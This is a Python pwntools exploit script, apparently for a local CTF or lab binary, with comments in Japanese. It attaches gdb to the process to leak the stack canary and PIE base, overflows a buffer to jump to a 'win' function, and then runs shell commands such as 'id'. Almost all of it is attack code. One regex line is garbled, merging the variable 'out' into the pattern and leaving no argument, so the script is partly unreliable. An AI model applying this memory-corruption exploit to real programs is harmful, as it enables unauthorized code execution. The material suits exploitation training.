import pwn
import subprocess
import re

pwn.context.arch = 'amd64'
pwn.context.log_level = 'info'

# a.out: PIE + canary, win = _Z3winv @ 0x11e9
# buf @ rbp-0x30, canary @ rbp-0x8 => offset 40
# canary is at fs:0x28 => *(fs_base + 0x28)
WIN_OFF = 0x11e9

io = pwn.process('./a.out')
io.recvuntil(b'value: ')
pid = io.pid
pwn.log.info(f'pid={pid}')

# gdb -batch -p <pid> : GUI なし、stdout に結果を出すだけ
# プロセスは read で止まっているので fs_base が読める
out = subprocess.check_output(
    [
        'gdb', '-q', '-p', str(pid), '-batch',
        '-ex', 'set pagination off',
        '-ex', 'set debuginfod enabled off',
        '-ex', 'printf "CANARY=0x%lx\\n", *(unsigned long*)($fs_base + 0x28)',
        '-ex', 'info proc mappings',
    ],
    stderr=subprocess.DEVNULL,
).decode(errors='replace')

# canary
m = re.search(r'CANARY=(0x[0-9a-f]+)out', )
assert m, f'canary leak failed:\n{out}'
canary = int(m.group(1), 16)

# PIE base: 最初の a.out マッピング行 (offset 0x0 の r--p)
base = None
for line in out.splitlines():
    if 'a.out' in line:
        base = int(line.split()[0].split('-')[0], 16)
        break
assert base, f'base leak failed:\n{out}'

win = base + WIN_OFF
pwn.log.info(f'canary={hex(canary)} base={hex(base)} win={hex(win)}')

payload  = b'A' * 40
payload += pwn.p64(canary)
payload += b'B' * 8
payload += pwn.p64(win)

# gdb -batch は detach して終了するので、プロセスは read 待ちに戻っている
io.send(payload)
import time; time.sleep(0.2)
io.sendline(b'echo PWNED_GDB_BATCH; id')
print(io.recvrepeat(timeout=2))
io.interactive()
